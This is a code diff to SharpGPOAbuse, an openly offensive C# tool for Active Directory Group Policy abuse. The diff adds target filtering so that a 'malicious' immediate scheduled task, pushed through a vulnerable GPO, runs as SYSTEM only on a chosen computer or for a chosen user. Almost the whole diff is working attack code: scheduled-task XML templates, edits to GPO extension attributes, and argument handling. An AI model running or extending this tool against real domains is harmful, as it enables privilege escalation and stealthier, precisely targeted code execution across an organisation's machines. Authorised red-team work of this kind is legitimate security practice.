@@ -33,6 +33,15 @@ namespace SharpGPOAbuse
         [Option("", "Arguments", Required = false, HelpText = "Command arguments of the immediate task.")]
         public string Arguments { get; set; }
 
+        [Option("", "TargetDnsName", Required = false, HelpText = "Target computer DNS name for filtered immediate task")]
+        public string TargetDnsName { get; set; }
+
+        [Option("", "TargetUsername", Required = false, HelpText = "Target username for filtered immediate task")]
+        public string TargetUsername { get; set; }
+
+        [Option("", "TargetUserSID", Required = false, HelpText = "Target user SID for filtered immediate task")]
+        public string TargetUserSID { get; set; }
+
         [Option("", "AddLocalAdmin", Required = false, HelpText = "Add new local admin.")]
         public bool AddLocalAdmin { get; set; }
 
@@ -50,6 +59,9 @@ namespace SharpGPOAbuse
 
         [Option("", "Force", Required = false, HelpText = "Overwrite existing files if required.")]
         public bool Force { get; set; }
+
+        [Option("", "FilterEnabled", Required = false, HelpText = "Enable target filtering for user and computer immediate tasks.")]
+        public bool FilterEnabled { get; set; }
 
         [Option("", "AddUserScript", Required = false, HelpText = "Add new user startup script.")]
         public bool AddUserScript { get; set; }
@@ -134,6 +146,11 @@ namespace SharpGPOAbuse
                 "\tArguments passed to the command.\n" +
                 "--GPOName\n" +
                 "\tThe name of the vulnerable GPO.\n" +
+                "Additional Options:\n" +
+                "--FilterEnabled\n" +
+                "\tEnable Target Filtering for computer immediate tasks.\n" +
+                "--TargetDnsName\n" +
+                "\tThe DNS name of the computer to target. The malicious task will run only on the specified host.\n" +
                 "\n" +
 
                 "\nOptions required to add a new user immediate task:\n" +
@@ -147,6 +164,13 @@ namespace SharpGPOAbuse
                 "\tArguments passed to the command.\n" +
                 "--GPOName\n" +
                 "\tThe name of the vulnerable GPO.\n" +
+                "Additional Options:\n" +
+                "--FilterEnabled\n" +
+                "\tEnable Target Filtering for user immediate tasks.\n" +
+                "--TargetUsername\n" +
+                "\tThe user to target. The malicious task will run only on the specified user. Should be in the format <DOMAIN>\\<USERNAME>\n" +
+                "--TargetUserSID\n" +
+                "\tThe targeted user's SID.\n" +
                 "\n" +
 
                 "\nOther options:\n" +
@@ -190,7 +214,7 @@ namespace SharpGPOAbuse
                 requiredProperties = new string[] { "versionNumber", "gPCUserExtensionNames" };
                 gPCExtensionName = "gPCUserExtensionNames";
             }
-            
+
 
 
             foreach (String property in requiredProperties)
@@ -223,7 +247,7 @@ namespace SharpGPOAbuse
                     new_ver = Convert.ToInt32(entryToUpdate.Properties["versionNumber"].Value) + 65536;
                     entryToUpdate.Properties["versionNumber"].Value = new_ver;
                 }
-                    
+
 
                 // update gPCMachineExtensionNames
                 String val1 = "";
@@ -244,196 +268,46 @@ namespace SharpGPOAbuse
                     }
 
                     try
-                        {
-                            if (!entryToUpdate.Properties[gPCExtensionName].Value.ToString().Contains(val2))
-                            {
-                                if (entryToUpdate.Properties[gPCExtensionName].Value.ToString().Contains(val1))
-                                {
-                                    string ent = entryToUpdate.Properties[gPCExtensionName].Value.ToString();
-
-                                    //Console.WriteLine("[!] DEBUG: Old gPCMachineExtensionNames: " + ent);
-
-                                    List<string> new_values = new List<string>();
-                                    String addition = val2;
-                                    var test = ent.Split('[');
-
-                                    foreach (string i in test)
-                                    {
-                                        new_values.Add(i.Replace("{", "").Replace("}", " ").Replace("]", ""));
-                                    }
-                                    //new_values.Add(addition);
-
-                                    for (var i = 1; i < new_values.Count; i++)
-                                    {
-                                        if (new_values[i].Contains(val1))
-                                        {
-                                            //Console.WriteLine(new_values[i]);
-                                            List<string> toSort = new List<string>();
-                                            string[] test2 = new_values[i].Split();
-                                            for (var f = 1; f < test2.Length; f++)
-                                            {
-                                                //Console.WriteLine(test2[f]);
-                                                toSort.Add(test2[f]);
-                                            }
-                                            toSort.Add(addition);
-                                            toSort.Sort();
-                                            new_values[i] = test2[0];
-                                            foreach (string val in toSort)
-                                            {
-                                                new_values[i] += " " + val;
-                                            }
-                                        }
-                                    }
-
-                                    List<string> new_values2 = new List<string>();
-                                    for (var i = 0; i < new_values.Count; i++)
-                                    {
-                                        if (string.IsNullOrEmpty(new_values[i])) { continue; }
-                                        string[] value1 = new_values[i].Split();
-                                        string new_val = "";
-                                        for (var q = 0; q < value1.Length; q++)
-                                        {
-                                            if (string.IsNullOrEmpty(value1[q])) { continue; }
-                                            new_val += "{" + value1[q] + "}";
-                                        }
-                                        new_val = "[" + new_val + "]";
-                                        new_values2.Add(new_val);
-                                    }
-                                    String final = string.Join("", new_values2.ToArray());
-                                    //Console.WriteLine("[!] DEBUG: New gPCMachineExtensionNames: " + final);
-                                    entryToUpdate.Properties[gPCExtensionName].Value = final;
-                                }
-
-                                else
-                                {
-                                    string ent = entryToUpdate.Properties[gPCExtensionName].Value.ToString();
-                                    //Console.WriteLine("[!] DEBUG: Old gPCMachineExtensionNames: " + ent);
-                                    List<string> new_values = new List<string>();
-                                    String addition = val1 + " " + val2;
-                                    var test = ent.Split('[');
-
-                                    foreach (string i in test)
-                                    {
-                                        new_values.Add(i.Replace("{", "").Replace("}", " ").Replace("]", ""));
-                                    }
-                                    new_values.Add(addition);
-                                    new_values.Sort();
-                                    List<string> new_values2 = new List<string>();
-
-                                    for (var i = 0; i < new_values.Count; i++)
-                                    {
-                                        if (string.IsNullOrEmpty(new_values[i])) { continue; }
-                                        string[] value1 = new_values[i].Split();
-                                        string new_val = "";
-                                        for (var q = 0; q < value1.Length; q++)
-                                        {
-                                            if (string.IsNullOrEmpty(value1[q])) { continue; }
-                                            new_val += "{" + value1[q] + "}";
-                                        }
-                                        new_val = "[" + new_val + "]";
-                                        new_values2.Add(new_val);
-                                    }
-                                    String final = string.Join("", new_values2.ToArray());
-                                    //Console.WriteLine("[!] DEBUG: New gPCMachineExtensionNames: " + final);
-                                    entryToUpdate.Properties[gPCExtensionName].Value = final;
-                                }
-
-                            }
-                            else
-                            {
-                                //Console.WriteLine("[!] DEBUG: the value of gPCMachineExtensionNames was already set.");
-                            }
-                        }
-                        // the following will execute when the gPCMachineExtensionNames is <not set>
-                        catch
-                        {
-                            entryToUpdate.Properties[gPCExtensionName].Value = "[{" + val1 + "}{" + val2 + "}]";
-                        }
-
-                }
-
-                // update gPCMachineExtensionNames to add immediate task
-                if (function == "NewImmediateTask")
-                {
-                    val1 = "00000000-0000-0000-0000-000000000000";
-                    val2 = "CAB54552-DEEA-4691-817E-ED4A4D1AFC72";
-                    string val3 = "AADCED64-746C-4633-A97C-D61349046527";
-
-                    try
                     {
-                            if (!entryToUpdate.Properties[gPCExtensionName].Value.ToString().Contains(val2))
+                        if (!entryToUpdate.Properties[gPCExtensionName].Value.ToString().Contains(val2))
+                        {
+                            if (entryToUpdate.Properties[gPCExtensionName].Value.ToString().Contains(val1))
                             {
-                                string toUpdate = entryToUpdate.Properties[gPCExtensionName].Value.ToString();
-                                //Console.WriteLine("[!] DEBUG: Old gPCMachineExtensionNames: " + toUpdate);
+                                string ent = entryToUpdate.Properties[gPCExtensionName].Value.ToString();
+
+                                //Console.WriteLine("[!] DEBUG: Old gPCMachineExtensionNames: " + ent);
 
                                 List<string> new_values = new List<string>();
-                                var test = toUpdate.Split('[');
+                                String addition = val2;
+                                var test = ent.Split('[');
 
                                 foreach (string i in test)
                                 {
                                     new_values.Add(i.Replace("{", "").Replace("}", " ").Replace("]", ""));
                                 }
+                                //new_values.Add(addition);
 
-                                // if zero GUID not in current value
-                                if (!toUpdate.Contains(val1))
+                                for (var i = 1; i < new_values.Count; i++)
                                 {
-                                    new_values.Add(val1 + " " + val2);
-                                }
-
-                                // if zero GUID exists in current value
-                                else if (toUpdate.Contains(val1))
-                                {
-                                    for (var k = 0; k < new_values.Count; k++)
+                                    if (new_values[i].Contains(val1))
                                     {
-                                        if (new_values[k].Contains(val1))
+                                        //Console.WriteLine(new_values[i]);
+                                        List<string> toSort = new List<string>();
+                                        string[] test2 = new_values[i].Split();
+                                        for (var f = 1; f < test2.Length; f++)
                                         {
-                                            List<string> toSort = new List<string>();
-                                            string[] test2 = new_values[k].Split();
-                                            for (var f = 1; f < test2.Length; f++)
-                                            {
-                                                toSort.Add(test2[f]);
-                                            }
-                                            toSort.Add(val2);
-                                            toSort.Sort();
-                                            new_values[k] = test2[0];
-                                            foreach (string val in toSort)
-                                            {
-                                                new_values[k] += " " + val;
-                                            }
+                                            //Console.WriteLine(test2[f]);
+                                            toSort.Add(test2[f]);
+                                        }
+                                        toSort.Add(addition);
+                                        toSort.Sort();
+                                        new_values[i] = test2[0];
+                                        foreach (string val in toSort)
+                                        {
+                                            new_values[i] += " " + val;
                                         }
                                     }
                                 }
-
-                                // if Scheduled Tasks GUID not in current value
-                                if (!toUpdate.Contains(val3))
-                                {
-                                    new_values.Add(val3 + " " + val2);
-                                }
-
-                                else if (toUpdate.Contains(val3))
-                                {
-                                    for (var k = 0; k < new_values.Count; k++)
-                                    {
-                                        if (new_values[k].Contains(val3))
-                                        {
-                                            List<string> toSort = new List<string>();
-                                            string[] test2 = new_values[k].Split();
-                                            for (var f = 1; f < test2.Length; f++)
-                                            {
-                                                toSort.Add(test2[f]);
-                                            }
-                                            toSort.Add(val2);
-                                            toSort.Sort();
-                                            new_values[k] = test2[0];
-                                            foreach (string val in toSort)
-                                            {
-                                                new_values[k] += " " + val;
-                                            }
-                                        }
-                                    }
-                                }
-
-                                new_values.Sort();
 
                                 List<string> new_values2 = new List<string>();
                                 for (var i = 0; i < new_values.Count; i++)
@@ -453,6 +327,156 @@ namespace SharpGPOAbuse
                                 //Console.WriteLine("[!] DEBUG: New gPCMachineExtensionNames: " + final);
                                 entryToUpdate.Properties[gPCExtensionName].Value = final;
                             }
+
+                            else
+                            {
+                                string ent = entryToUpdate.Properties[gPCExtensionName].Value.ToString();
+                                //Console.WriteLine("[!] DEBUG: Old gPCMachineExtensionNames: " + ent);
+                                List<string> new_values = new List<string>();
+                                String addition = val1 + " " + val2;
+                                var test = ent.Split('[');
+
+                                foreach (string i in test)
+                                {
+                                    new_values.Add(i.Replace("{", "").Replace("}", " ").Replace("]", ""));
+                                }
+                                new_values.Add(addition);
+                                new_values.Sort();
+                                List<string> new_values2 = new List<string>();
+
+                                for (var i = 0; i < new_values.Count; i++)
+                                {
+                                    if (string.IsNullOrEmpty(new_values[i])) { continue; }
+                                    string[] value1 = new_values[i].Split();
+                                    string new_val = "";
+                                    for (var q = 0; q < value1.Length; q++)
+                                    {
+                                        if (string.IsNullOrEmpty(value1[q])) { continue; }
+                                        new_val += "{" + value1[q] + "}";
+                                    }
+                                    new_val = "[" + new_val + "]";
+                                    new_values2.Add(new_val);
+                                }
+                                String final = string.Join("", new_values2.ToArray());
+                                //Console.WriteLine("[!] DEBUG: New gPCMachineExtensionNames: " + final);
+                                entryToUpdate.Properties[gPCExtensionName].Value = final;
+                            }
+
+                        }
+                        else
+                        {
+                            //Console.WriteLine("[!] DEBUG: the value of gPCMachineExtensionNames was already set.");
+                        }
+                    }
+                    // the following will execute when the gPCMachineExtensionNames is <not set>
+                    catch
+                    {
+                        entryToUpdate.Properties[gPCExtensionName].Value = "[{" + val1 + "}{" + val2 + "}]";
+                    }
+
+                }
+
+                // update gPCMachineExtensionNames to add immediate task
+                if (function == "NewImmediateTask")
+                {
+                    val1 = "00000000-0000-0000-0000-000000000000";
+                    val2 = "CAB54552-DEEA-4691-817E-ED4A4D1AFC72";
+                    string val3 = "AADCED64-746C-4633-A97C-D61349046527";
+
+                    try
+                    {
+                        if (!entryToUpdate.Properties[gPCExtensionName].Value.ToString().Contains(val2))
+                        {
+                            string toUpdate = entryToUpdate.Properties[gPCExtensionName].Value.ToString();
+                            //Console.WriteLine("[!] DEBUG: Old gPCMachineExtensionNames: " + toUpdate);
+
+                            List<string> new_values = new List<string>();
+                            var test = toUpdate.Split('[');
+
+                            foreach (string i in test)
+                            {
+                                new_values.Add(i.Replace("{", "").Replace("}", " ").Replace("]", ""));
+                            }
+
+                            // if zero GUID not in current value
+                            if (!toUpdate.Contains(val1))
+                            {
+                                new_values.Add(val1 + " " + val2);
+                            }
+
+                            // if zero GUID exists in current value
+                            else if (toUpdate.Contains(val1))
+                            {
+                                for (var k = 0; k < new_values.Count; k++)
+                                {
+                                    if (new_values[k].Contains(val1))
+                                    {
+                                        List<string> toSort = new List<string>();
+                                        string[] test2 = new_values[k].Split();
+                                        for (var f = 1; f < test2.Length; f++)
+                                        {
+                                            toSort.Add(test2[f]);
+                                        }
+                                        toSort.Add(val2);
+                                        toSort.Sort();
+                                        new_values[k] = test2[0];
+                                        foreach (string val in toSort)
+                                        {
+                                            new_values[k] += " " + val;
+                                        }
+                                    }
+                                }
+                            }
+
+                            // if Scheduled Tasks GUID not in current value
+                            if (!toUpdate.Contains(val3))
+                            {
+                                new_values.Add(val3 + " " + val2);
+                            }
+
+                            else if (toUpdate.Contains(val3))
+                            {
+                                for (var k = 0; k < new_values.Count; k++)
+                                {
+                                    if (new_values[k].Contains(val3))
+                                    {
+                                        List<string> toSort = new List<string>();
+                                        string[] test2 = new_values[k].Split();
+                                        for (var f = 1; f < test2.Length; f++)
+                                        {
+                                            toSort.Add(test2[f]);
+                                        }
+                                        toSort.Add(val2);
+                                        toSort.Sort();
+                                        new_values[k] = test2[0];
+                                        foreach (string val in toSort)
+                                        {
+                                            new_values[k] += " " + val;
+                                        }
+                                    }
+                                }
+                            }
+
+                            new_values.Sort();
+
+                            List<string> new_values2 = new List<string>();
+                            for (var i = 0; i < new_values.Count; i++)
+                            {
+                                if (string.IsNullOrEmpty(new_values[i])) { continue; }
+                                string[] value1 = new_values[i].Split();
+                                string new_val = "";
+                                for (var q = 0; q < value1.Length; q++)
+                                {
+                                    if (string.IsNullOrEmpty(value1[q])) { continue; }
+                                    new_val += "{" + value1[q] + "}";
+                                }
+                                new_val = "[" + new_val + "]";
+                                new_values2.Add(new_val);
+                            }
+                            String final = string.Join("", new_values2.ToArray());
+                            //Console.WriteLine("[!] DEBUG: New gPCMachineExtensionNames: " + final);
+                            entryToUpdate.Properties[gPCExtensionName].Value = final;
+                        }
                         else
                         {
                             //Console.WriteLine("[!] DEBUG: the value of gPCMachineExtensionNames was already set.");
@@ -808,19 +832,32 @@ Revision=1";
             }
         }
 
-        public static void NewImmediateTask(String Domain, String DomainController, String GPOName, String distinguished_name, String task_name, String author, String arguments, String command, bool Force, String objectType)
+        public static void NewImmediateTask(String Domain, String DomainController, String GPOName, String distinguished_name, String task_name, String author, String arguments, String command, bool Force, String objectType, bool filterEnabled, String targetUsername, String targetUserSID, String targetDnsName)
         {
             string ImmediateTaskXML;
             string start = @"<?xml version=""1.0"" encoding=""utf-8""?><ScheduledTasks clsid=""{CC63F200-7309-4ba0-B154-A71CD118DBCC}"">";
             string end = @"</ScheduledTasks>";
             if (objectType.Equals("Computer"))
             {
-                ImmediateTaskXML = string.Format(@"<ImmediateTaskV2 clsid=""{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}"" name=""{1}"" image=""0"" changed=""2019-03-30 23:04:20"" uid=""{4}""><Properties action=""C"" name=""{1}"" runAs=""NT AUTHORITY\System"" logonType=""S4U""><Task version=""1.3""><RegistrationInfo><Author>{0}</Author><Description></Description></RegistrationInfo><Principals><Principal id=""Author""><UserId>NT AUTHORITY\System</UserId><LogonType>S4U</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context=""Author""><Exec><Command>{2}</Command><Arguments>{3}</Arguments></Exec></Actions></Task></Properties></ImmediateTaskV2>", author, task_name, command, arguments, Guid.NewGuid().ToString());
+                if (filterEnabled)
+                {
+                    ImmediateTaskXML = string.Format(@"<ImmediateTaskV2 clsid=""{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}"" name=""{1}"" image=""0"" changed=""2019-03-30 23:04:20"" uid=""{4}""><Properties action=""C"" name=""{1}"" runAs=""NT AUTHORITY\System"" logonType=""S4U""><Task version=""1.3""><RegistrationInfo><Author>{0}</Author><Description></Description></RegistrationInfo><Principals><Principal id=""Author""><UserId>NT AUTHORITY\System</UserId><LogonType>S4U</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context=""Author""><Exec><Command>{2}</Command><Arguments>{3}</Arguments></Exec></Actions></Task></Properties><Filters><FilterComputer bool=""AND"" not=""0"" type=""DNS"" name=""{5}""/></Filters></ImmediateTaskV2>", author, task_name, command, arguments, Guid.NewGuid().ToString(), targetDnsName);
+                }
+                else
+                {
+                    ImmediateTaskXML = string.Format(@"<ImmediateTaskV2 clsid=""{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}"" name=""{1}"" image=""0"" changed=""2019-03-30 23:04:20"" uid=""{4}""><Properties action=""C"" name=""{1}"" runAs=""NT AUTHORITY\System"" logonType=""S4U""><Task version=""1.3""><RegistrationInfo><Author>{0}</Author><Description></Description></RegistrationInfo><Principals><Principal id=""Author""><UserId>NT AUTHORITY\System</UserId><LogonType>S4U</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context=""Author""><Exec><Command>{2}</Command><Arguments>{3}</Arguments></Exec></Actions></Task></Properties></ImmediateTaskV2>", author, task_name, command, arguments, Guid.NewGuid().ToString());
+                }
             }
             else
             {
-                ImmediateTaskXML = string.Format(@"<ImmediateTaskV2 clsid=""{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}"" name=""{1}"" image=""0"" changed=""2019-07-25 14:05:31"" uid=""{4}""><Properties action=""C"" name=""{1}"" runAs=""%LogonDomain%\%LogonUser%"" logonType=""InteractiveToken""><Task version=""1.3""><RegistrationInfo><Author>{0}</Author><Description></Description></RegistrationInfo><Principals><Principal id=""Author""><UserId>%LogonDomain%\%LogonUser%</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context=""Author""><Exec><Command>{2}</Command><Arguments>{3}</Arguments></Exec></Actions></Task></Properties></ImmediateTaskV2>", author, task_name, command, arguments, Guid.NewGuid().ToString());
-
+                if (filterEnabled)
+                {
+                    ImmediateTaskXML = string.Format(@"<ImmediateTaskV2 clsid=""{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}"" name=""{1}"" image=""0"" changed=""2019-07-25 14:05:31"" uid=""{4}""><Properties action=""C"" name=""{1}"" runAs=""%LogonDomain%\%LogonUser%"" logonType=""InteractiveToken""><Task version=""1.3""><RegistrationInfo><Author>{0}</Author><Description></Description></RegistrationInfo><Principals><Principal id=""Author""><UserId>%LogonDomain%\%LogonUser%</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context=""Author""><Exec><Command>{2}</Command><Arguments>{3}</Arguments></Exec></Actions></Task></Properties><Filters><FilterUser bool=""AND"" not=""0"" name=""{5}"" sid=""{6}""/></Filters></ImmediateTaskV2>", author, task_name, command, arguments, Guid.NewGuid().ToString(), targetUsername, targetUserSID);
+                }
+                else
+                {
+                    ImmediateTaskXML = string.Format(@"<ImmediateTaskV2 clsid=""{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}"" name=""{1}"" image=""0"" changed=""2019-07-25 14:05:31"" uid=""{4}""><Properties action=""C"" name=""{1}"" runAs=""%LogonDomain%\%LogonUser%"" logonType=""InteractiveToken""><Task version=""1.3""><RegistrationInfo><Author>{0}</Author><Description></Description></RegistrationInfo><Principals><Principal id=""Author""><UserId>%LogonDomain%\%LogonUser%</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context=""Author""><Exec><Command>{2}</Command><Arguments>{3}</Arguments></Exec></Actions></Task></Properties></ImmediateTaskV2>", author, task_name, command, arguments, Guid.NewGuid().ToString());
+                }
             }
 
             String GPOGuid = GetGPOGUID(DomainController, GPOName, distinguished_name);
@@ -1076,6 +1113,10 @@ Revision = 1
             bool AddLocalAdmin = false;
             bool AddComputerTask = false;
             bool AddUserTask = false;
+            bool filterEnabled = false;
+            String targetDnsName = "";
+            String targetUsername = "";
+            String targetUserSID = "";
 
             String ScriptContents = "";
             String ScriptName = "";
@@ -1101,7 +1142,7 @@ Revision = 1
                     return;
                 }
                 // check that only one attack was specified
-                if ( !(Options.AddLocalAdmin ^ Options.AddUserRights ^ Options.AddUserScript ^ Options.AddComputerScript ^ Options.AddUserTask ^ Options.AddComputerTask) )
+                if (!(Options.AddLocalAdmin ^ Options.AddUserRights ^ Options.AddUserScript ^ Options.AddComputerScript ^ Options.AddUserTask ^ Options.AddComputerTask))
                 {
                     Console.WriteLine("[!] You can only specify one attack at a time.\n[-] Exiting\n");
                     return;
@@ -1170,6 +1211,39 @@ Revision = 1
                         Console.WriteLine("[!] To add a new immediate task the following options are needed:\n\t--Author\n\t--TaskName\n\t--Arguments\n\t--Command\n\n[-] Exiting...");
                         return;
                     }
+
+                    if (Options.FilterEnabled)
+                    {
+                        filterEnabled = true;
+                    }
+
+                    if (AddComputerTask && filterEnabled)
+                    {
+                        if (string.IsNullOrEmpty(Options.TargetDnsName))
+                        {
+                            Console.WriteLine("[!] To add a new computer immediate task with a target filter the following options are needed:\n\t--TargetDnsName <ComputerDNSName>\n\n[-] Exiting...");
+                            return;
+                        }
+                        else
+                        {
+                            targetDnsName = Options.TargetDnsName;
+                        }
+                    }
+
+                    if (AddUserTask && filterEnabled)
+                    {
+                        if (string.IsNullOrEmpty(Options.TargetUsername) || string.IsNullOrEmpty(Options.TargetUserSID))
+                        {
+                            Console.WriteLine("[!] To add a new user immediate task with a target filter the following options are needed:\n\t--TargetUsername domain\\username\n\t--TargetUserSID <SID>\n\n[-] Exiting...");
+                            return;
+                        }
+                        else
+                        {
+                            targetUsername = Options.TargetUsername;
+                            targetUserSID = Options.TargetUserSID;
+                        }
+                    }
+
                     task_name = Options.TaskName;
                     author = Options.Author;
                     arguments = Options.Arguments;
@@ -1276,12 +1350,26 @@ Revision = 1
             // Add new scheduled task
             if (AddUserTask)
             {
-                NewImmediateTask(Domain, DomainController, GPOName, distinguished_name, task_name, author, arguments, command, Force, "User");
+                if (filterEnabled)
+                {
+                    NewImmediateTask(Domain, DomainController, GPOName, distinguished_name, task_name, author, arguments, command, Force, "User", true, targetUsername, targetUserSID, "");
+                }
+                else
+                {
+                    NewImmediateTask(Domain, DomainController, GPOName, distinguished_name, task_name, author, arguments, command, Force, "User", false, "", "", "");
+                }
             }
 
             if (AddComputerTask)
             {
-                NewImmediateTask(Domain, DomainController, GPOName, distinguished_name, task_name, author, arguments, command, Force, "Computer");
+                if (filterEnabled)
+                {
+                    NewImmediateTask(Domain, DomainController, GPOName, distinguished_name, task_name, author, arguments, command, Force, "Computer", true, "", "", targetDnsName);
+                }
+                else
+                {
+                    NewImmediateTask(Domain, DomainController, GPOName, distinguished_name, task_name, author, arguments, command, Force, "Computer", false, "", "", "");
+                }
             }
 
             // Add new startup script
